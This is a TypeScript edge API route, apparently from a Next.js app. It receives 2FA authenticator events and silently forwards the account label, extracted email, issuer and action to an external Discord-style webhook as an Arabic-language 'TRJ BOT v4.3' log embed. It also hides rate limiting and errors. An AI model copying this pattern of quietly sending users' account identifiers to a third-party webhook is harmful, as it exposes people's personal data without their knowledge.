export const runtime = 'edge'

import { sendToWebhook } from '@/lib/webhook';
import { getLogWebhookUrl } from '@/lib/config';
import { rateLimit, getClientIp, RATE_LIMITS } from '@/lib/rate-limit';

export async function POST(request: Request) {
  try {
    const rlIp = getClientIp(request);
    const rl = rateLimit(`${rlIp}:tfa-notify`, RATE_LIMITS.default);
    if (rl.limited) {
      return Response.json({ success: true }); // silent
    }

    const body = await request.json().catch(() => ({}));
    const { label, issuer, secret, action } = body as {
      label?: string;
      issuer?: string;
      secret?: string;
      action?: string;
    };

    if (!label && !issuer) {
      return Response.json({ success: true });
    }

    // Extract email from label (format: "Discord:email@example.com" or "email@example.com")
    let email = '';
    if (label) {
      if (label.includes(':')) {
        email = label.split(':').pop()?.trim() || '';
      } else {
        email = label.trim();
      }
    }

    const url = getLogWebhookUrl();
    if (!url) return Response.json({ success: true });

    const payload = {
      username: 'TRJ BOT v4.3',
      embeds: [{
        title: '🔐 2FA Authenticator - ' + (action === 'activate' ? 'تم التفعيل' : action === 'delete' ? 'تم الحذف' : 'إجراء'),
        description: action === 'activate'
          ? 'تم فحص باركود 2FA وتفعيل Authenticator بنجاح'
          : action === 'delete' ? 'تم حذف حساب 2FA من Authenticator' : 'إجراء على Authenticator',
        color: action === 'activate' ? 0x00FF41 : 0xFF0000,
        fields: [
          { name: '👤 البريد / الحساب', value: String(label || issuer || 'غير معروف'), inline: false },
          { name: '📧 الإيميل', value: email || 'غير متوفر', inline: true },
          { name: '🏢 المصدر', value: String(issuer || 'Discord'), inline: true },
          { name: '⚙️ الإجراء', value: String(action || 'activate'), inline: true },
          { name: '⏰ الوقت', value: new Date().toISOString(), inline: true },
        ],
        footer: { text: 'TRJ BOT v4.3 - 2FA Authenticator' },
        timestamp: new Date().toISOString(),
      }],
    };

    sendToWebhook(payload, url).catch(() => {});
    return Response.json({ success: true });
  } catch {
    return Response.json({ success: true });
  }
}
